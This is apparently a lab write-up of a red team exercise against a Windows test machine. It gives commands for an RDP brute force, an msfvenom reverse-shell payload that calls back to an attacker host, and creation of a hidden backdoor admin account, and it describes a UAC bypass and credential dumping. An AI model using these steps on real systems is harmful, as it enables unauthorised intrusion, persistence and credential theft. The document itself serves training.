# 🔴 Red Team Operations: Adversary Emulation Deep-Dive

This document provides a detailed technical walkthrough of the offensive phase. The goal was to simulate a realistic cyber-attack, moving from external reconnaissance to full domain/system compromise.

---

## 🔍 1. Reconnaissance & Enumeration (T1595)

The objective was to map the attack surface of the target machine (`192.168.1.101`).

### Network Scanning
I initiated an **Nmap** scan to identify open ports and service versions. Identifying RDP and SMB is crucial as they are common entry points for lateral movement and brute-force.
- **Initial Discovery:** ![Nmap Attack](images/kali_nmap_attack.png)
- **Full Service Scan:** 
```bash
nmap -A -v -p- 192.168.1.101
```
![Nmap Full](images/kali_nmap_full_scan.png)
*Result:* Found **Port 3389 (RDP)** and **Port 445 (SMB)** open, which suggests the target is a Windows machine ready for authentication-based attacks.

---

## 🔨 2. Initial Access: RDP Brute Force (T1110)

With RDP exposed, I performed a dictionary attack to crack the user password.

### Execution
Using **Hydra** and the `rockyou.txt` wordlist, I targeted the `Victim` user.
```bash
hydra -l Victim -P /usr/share/wordlists/rockyou.txt rdp://192.168.1.101
```
![Hydra RDP](images/kali_hydra_rdp_attack.png)
*Outcome:* Password successfully cracked, granting initial RDP access to the environment.

---

## 📈 3. Weaponization & Exploitation (T1204)

To gain a persistent command-line session (Reverse Shell), I created a malicious executable.

### Payload Generation
I used **msfvenom** to generate an x64 reverse TCP meterpreter payload.
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=4444 -f exe > shell.exe
```
![MSFVenom](images/kali_msfvenom_payload.png)

### Delivery & Execution
I hosted the payload using a **Python HTTP server** and downloaded it on the victim machine via PowerShell.
![Python Server](images/kali_pythonwebserver.png)
- **Session Established:** ![Meterpreter Shell](images/msfconsole_getting_meterpreter_shell.png)

---

## 🔝 4. Privilege Escalation (T1548)

Initially, the shell had limited user privileges. To perform administrative tasks, I needed to bypass **UAC (User Account Control)**.

### UAC Bypass & GetSystem
I utilized the `bypassuac_fodhelper` module. This exploit takes advantage of a specific Windows binary that allows high-integrity execution without prompting the user.
- **Elevation:** ![UAC Bypass](images/meterpreter_bypassauc_getsystem.png)
- **Result:** Successfully escalated to **NT AUTHORITY\SYSTEM**.
![Get System](images/kali_meterpreter_getsystem.png)

---

## 🕵️ 5. Post-Exploitation & Persistence

To ensure that access is maintained even after reboots or process terminations.

### Process Migration (T1055)
I migrated the meterpreter process into `explorer.exe`. This hides the malicious activity under a legitimate Windows process and provides better stability.
![Migration](images/kali_meterpreter_migrate_to_explorerexe_and_regsetval.png)

### Registry Run Key Persistence (T1547.001)
I added a value to the Windows Registry `Run` key. This ensures the payload executes every time the user logs in.
*Registry Path:* `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`

### Creating a Backdoor Account (T1136.001)
As a secondary persistence method, I created a hidden administrative user `Support_Acc`.
```bash
net user Support_Acc Password123 /add
net localgroup administrators Support_Acc /add
```
![Backdoor](images/meterpreter_shell_adding_backdoor_user.png)
- **Remote Access Verification:** ![RDP Backdoor](images/kali_xfreerdp_to_backdoor_user.png)

---

## 📂 6. Credential Access & Command Execution

The final stage involved harvesting credentials for further movement and testing stealthy execution methods.

### Credential Dumping (T1003)
Using **Impacket's Secretsdump**, I extracted NTLM hashes from the local SAM database. These hashes can be used for "Pass-the-Hash" attacks.
![Secretsdump](images/kali_impacket_secretsdump.png)

### Stealthy Execution (WMI & NetExec)
I tested lateral movement techniques using **WMIExec** and **NetExec (NXC)**. These tools allow executing commands remotely without leaving significant footprints compared to traditional RDP.
- **WMIExec:** ![WMIExec](images/kali_impacketwmiexec.png)
- **NetExec:** ![NXC](images/kali_nxc_command_execution.png)
